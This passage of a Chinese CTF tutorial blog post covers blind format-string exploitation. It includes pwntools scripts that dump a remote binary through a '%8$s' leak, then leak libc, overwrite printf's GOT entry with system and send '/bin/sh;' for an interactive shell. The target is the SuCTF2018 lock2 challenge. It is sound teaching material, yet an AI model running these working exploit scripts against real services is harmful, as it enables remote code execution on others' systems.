<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">##context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    <span class="comment"># leak addr for three times</span></span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> num &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;leak addr: &#x27;</span> + <span class="built_in">hex</span>(addr)</span><br><span class="line">            sh = remote(ip, port)</span><br><span class="line">            payload = <span class="string">&#x27;%00008$s&#x27;</span> + <span class="string">&#x27;STARTEND&#x27;</span> + p64(addr)</span><br><span class="line">            <span class="comment"># 说明有\n，出现新的一行</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;\x0a&#x27;</span> <span class="keyword">in</span> payload:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            sh.sendline(payload)</span><br><span class="line">            data = sh.recvuntil(<span class="string">&#x27;STARTEND&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            num += <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getbinary</span>():</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;binary&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    <span class="keyword">while</span> addr &lt; <span class="number">0x401000</span>:</span><br><span class="line">        data = leak(addr)</span><br><span class="line">        <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            f.write(<span class="string">&#x27;\xff&#x27;</span>)</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(data) == <span class="number">0</span>:</span><br><span class="line">            f.write(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            f.write(data)</span><br><span class="line">            addr += <span class="built_in">len</span>(data)</span><br><span class="line">    f.close()</span><br><span class="line">getbinary()</span><br></pre></td></tr></table></figure>

<p>需要注意的是，在 payload 中需要判断是否有 ‘\n’ 出现，因为这样会导致源程序只读取前面的内容，而没有办法泄露内存，所以需要跳过这样的地址。</p>
<h4 id="分析-binary"><a href="#分析-binary" class="headerlink" title="分析 binary"></a>分析 binary</h4><p>利用 IDA 打开泄露的 binary ，改变程序基地址，然后简单看看，可以基本确定源程序 main 函数的地址</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">seg000:00000000004005F6                 push    rbp</span><br><span class="line">seg000:00000000004005F7                 mov     rbp, rsp</span><br><span class="line">seg000:00000000004005FA                 add     rsp, 0FFFFFFFFFFFFFF80h</span><br><span class="line">seg000:00000000004005FE</span><br><span class="line">seg000:00000000004005FE loc_4005FE:                             ; CODE XREF: seg000:0000000000400639j</span><br><span class="line">seg000:00000000004005FE                 lea     rax, [rbp-80h]</span><br><span class="line">seg000:0000000000400602                 mov     edx, 80h ; &#x27;€&#x27;</span><br><span class="line">seg000:0000000000400607                 mov     rsi, rax</span><br><span class="line">seg000:000000000040060A                 mov     edi, 0</span><br><span class="line">seg000:000000000040060F                 mov     eax, 0</span><br><span class="line">seg000:0000000000400614                 call    sub_4004C0</span><br><span class="line">seg000:0000000000400619                 lea     rax, [rbp-80h]</span><br><span class="line">seg000:000000000040061D                 mov     rdi, rax</span><br><span class="line">seg000:0000000000400620                 mov     eax, 0</span><br><span class="line">seg000:0000000000400625                 call    sub_4004B0</span><br><span class="line">seg000:000000000040062A                 mov     rax, cs:601048h</span><br><span class="line">seg000:0000000000400631                 mov     rdi, rax</span><br><span class="line">seg000:0000000000400634                 call    near ptr unk_4004E0</span><br><span class="line">seg000:0000000000400639                 jmp     short loc_4005FE</span><br></pre></td></tr></table></figure>

<p>可以基本确定的是 sub_4004C0 为 read 函数，因为读入函数一共有三个参数的话，基本就是 read 了。此外，下面调用的 sub_4004B0 应该就是输出函数了，再之后应该又调用了一个函数，此后又重新跳到读入函数处，那程序应该是一个 while 1 的循环，一直在执行。</p>
<p><strong>注解：</strong>补充一张图</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="_images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/fmrstr_6.png" alt="fmrstr_6"></p>
<h4 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h4><p>分析完上面的之后，我们可以确定如下基本思路</p>
<ul>
<li>泄露 printf 函数的地址，</li>
<li>获取对应 libc 以及 system 函数地址</li>
<li>修改 printf 地址为 system 函数地址</li>
<li>读入 /bin/sh; 以便于获取 shell</li>
</ul>
<h4 id="利用程序-3"><a href="#利用程序-3" class="headerlink" title="利用程序"></a>利用程序</h4><p>程序如下。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##coding=utf8</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="comment">##context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    <span class="comment"># leak addr for three times</span></span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> num &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;leak addr: &#x27;</span> + <span class="built_in">hex</span>(addr)</span><br><span class="line">            sh = remote(ip, port)</span><br><span class="line">            payload = <span class="string">&#x27;%00008$s&#x27;</span> + <span class="string">&#x27;STARTEND&#x27;</span> + p64(addr)</span><br><span class="line">            <span class="comment"># 说明有\n，出现新的一行</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;\x0a&#x27;</span> <span class="keyword">in</span> payload:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            sh.sendline(payload)</span><br><span class="line">            data = sh.recvuntil(<span class="string">&#x27;STARTEND&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            num += <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getbinary</span>():</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;binary&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    <span class="keyword">while</span> addr &lt; <span class="number">0x401000</span>:</span><br><span class="line">        data = leak(addr)</span><br><span class="line">        <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            f.write(<span class="string">&#x27;\xff&#x27;</span>)</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(data) == <span class="number">0</span>:</span><br><span class="line">            f.write(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            f.write(data)</span><br><span class="line">            addr += <span class="built_in">len</span>(data)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##getbinary()</span></span><br><span class="line">read_got = <span class="number">0x601020</span></span><br><span class="line">printf_got = <span class="number">0x601018</span></span><br><span class="line">sh = remote(ip, port)</span><br><span class="line"><span class="comment">## let the read get resolved</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line"><span class="comment">## get printf addr</span></span><br><span class="line">payload = <span class="string">&#x27;%00008$s&#x27;</span> + <span class="string">&#x27;STARTEND&#x27;</span> + p64(read_got)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">data = sh.recvuntil(<span class="string">&#x27;STARTEND&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">read_addr = u64(data)</span><br><span class="line"></span><br><span class="line"><span class="comment">## get system addr</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>, read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&#x27;system addr: &#x27;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line">log.success(<span class="string">&#x27;read   addr: &#x27;</span> + <span class="built_in">hex</span>(read_addr))</span><br><span class="line"><span class="comment">## modify printf_got</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>, &#123;printf_got: system_addr&#125;, <span class="number">0</span>, write_size=<span class="string">&#x27;short&#x27;</span>)</span><br><span class="line"><span class="comment">## get all the addr</span></span><br><span class="line">addr = payload[:<span class="number">32</span>]</span><br><span class="line">payload = <span class="string">&#x27;%32d&#x27;</span> + payload[<span class="number">32</span>:]</span><br><span class="line">offset = (<span class="built_in">int</span>)(math.ceil(<span class="built_in">len</span>(payload) / <span class="number">8.0</span>) + <span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>, <span class="number">10</span>):</span><br><span class="line">    old = <span class="string">&#x27;%&#123;&#125;$&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">    new = <span class="string">&#x27;%&#123;&#125;$&#x27;</span>.<span class="built_in">format</span>(offset + i)</span><br><span class="line">    payload = payload.replace(old, new)</span><br><span class="line">remainer = <span class="built_in">len</span>(payload) % <span class="number">8</span></span><br><span class="line">payload += (<span class="number">8</span> - remainer) * <span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload += addr</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment">## get shell</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh;&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>这里需要注意的是这一段代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## modify printf_got</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>, &#123;printf_got: system_addr&#125;, <span class="number">0</span>, write_size=<span class="string">&#x27;short&#x27;</span>)</span><br><span class="line"><span class="comment">## get all the addr</span></span><br><span class="line">addr = payload[:<span class="number">32</span>]</span><br><span class="line">payload = <span class="string">&#x27;%32d&#x27;</span> + payload[<span class="number">32</span>:]</span><br><span class="line">offset = (<span class="built_in">int</span>)(math.ceil(<span class="built_in">len</span>(payload) / <span class="number">8.0</span>) + <span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>, <span class="number">10</span>):</span><br><span class="line">    old = <span class="string">&#x27;%&#123;&#125;$&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">    new = <span class="string">&#x27;%&#123;&#125;$&#x27;</span>.<span class="built_in">format</span>(offset + i)</span><br><span class="line">    payload = payload.replace(old, new)</span><br><span class="line">remainer = <span class="built_in">len</span>(payload) % <span class="number">8</span></span><br><span class="line">payload += (<span class="number">8</span> - remainer) * <span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload += addr</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br></pre></td></tr></table></figure>

<p>fmtstr_payload 直接得到的 payload 会将地址放在前面，而这个会导致 printf 的时候 ‘\x00’ 截断（<strong>关于这一问题，pwntools 目前正在开发 fmt_payload 的加强版，估计快开发出来了。</strong>）。所以我使用了一些技巧将它放在后面了。主要的思想是，将地址放在后面 8 字节对齐的地方，并对 payload 中的偏移进行修改。需要注意的是</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">offset = (int)(math.ceil(len(payload) / 8.0) + 1)</span><br></pre></td></tr></table></figure>

<p>这一行给出了修改后的地址在格式化字符串中的偏移，之所以是这样在于无论如何修改，由于 ‘%order$hn’ 中 order 多出来的字符都不会大于 8。具体的可以自行推导。</p>
<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><ul>
<li>SuCTF2018 - lock2 （主办方提供了 docker 镜像: suctf/2018-pwn-lock2）</li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">SkYe231</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.mrskye.cn/archives/91d59204/">https://www.mrskye.cn/archives/91d59204/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.mrskye.cn" target="_blank">SkYe231 Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PWN/">PWN</a><a class="post-meta__tags" href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6/">格式化字符</a></div><div class="post_share"><div class="social-share" data-image="/img/default_cover2.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/archives/5bd18a78/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/default_cover2.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">格式化字符串漏洞基础利用</div></div></a></div><div class="next-post pull-right"><a href="/archives/973b495c/"><img class="next-cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/default_cover0.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">第二届网鼎杯青龙组部分题目Writeup</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/archives/5bd18a78/" title="格式化字符串漏洞基础利用"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/default_cover2.png" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2021-04-06</div><div class="title">格式化字符串漏洞基础利用</div></div></a></div><div><a href="/archives/9058dffc/" title="ASLR与PIE学习笔记"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/default_cover5.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2021-03-26</div><div class="title">ASLR与PIE学习笔记</div></div></a></div><div><a href="/archives/bd0188a8/" title="劫持 fileno 控制文件流"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/default_cover1.png" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2021-04-06</div><div class="title">劫持 fileno 控制文件流</div></div></a></div><div><a href="/archives/625c64bd/" title="House of orange"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/default_cover6.png" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2021-05-01</div><div class="title">House of orange</div></div></a></div><div><a href="/archives/114d7ffc/" title="House_of_Lore"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/default_cover5.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2021-04-06</div><div class="title">House_of_Lore</div></div></a></div><div><a href="/archives/36f80a82/" title="realloc_hook 调整栈帧使 onegadget 生效"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/default_cover6.png" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2021-03-28</div><div class="title">realloc_hook 调整栈帧使 onegadget 生效</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">SkYe231</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">135</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">173</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div></div><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:skye231@foxmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://www.mrskye.cn/atom.xml" target="_blank" title="RSS"><i class="fas fa-rss"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?uin=910437231" target="_blank" title="QQ"><i class="iconfont icon-QQ"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">请修改默认公告</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90"><span class="toc-number">1.</span> <span class="toc-text">格式化字符串漏洞基础例子</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#64-%E4%BD%8D%E7%A8%8B%E5%BA%8F%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.</span> <span class="toc-text">64 位程序格式化字符串漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-number">1.1.2.</span> <span class="toc-text">例子</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">确定保护</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">分析程序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">利用程序</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hijack-GOT"><span class="toc-number">1.2.</span> <span class="toc-text">hijack GOT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">例子</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E4%BF%9D%E6%8A%A4-1"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">确定保护</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E7%A8%8B%E5%BA%8F-1"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">分析程序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">漏洞利用思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">漏洞利用程序</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hijack-retaddr"><span class="toc-number">1.3.</span> <span class="toc-text">hijack retaddr</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90-2"><span class="toc-number">1.3.2.</span> <span class="toc-text">例子</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E4%BF%9D%E6%8A%A4-2"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">确定保护</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E7%A8%8B%E5%BA%8F-2"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">分析程序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E5%81%8F%E7%A7%BB"><span class="toc-number">1.3.2.4.</span> <span class="toc-text">确定偏移</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E5%9C%B0%E5%9D%80"><span class="toc-number">1.3.2.5.</span> <span class="toc-text">修改地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F-1"><span class="toc-number">1.3.2.6.</span> <span class="toc-text">利用程序</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E4%B8%8A%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.4.</span> <span class="toc-text">堆上的格式化字符串漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-3"><span class="toc-number">1.4.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90-3"><span class="toc-number">1.4.2.</span> <span class="toc-text">例子</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E4%BF%9D%E6%8A%A4-3"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">确定保护</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E7%A8%8B%E5%BA%8F-3"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">分析程序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 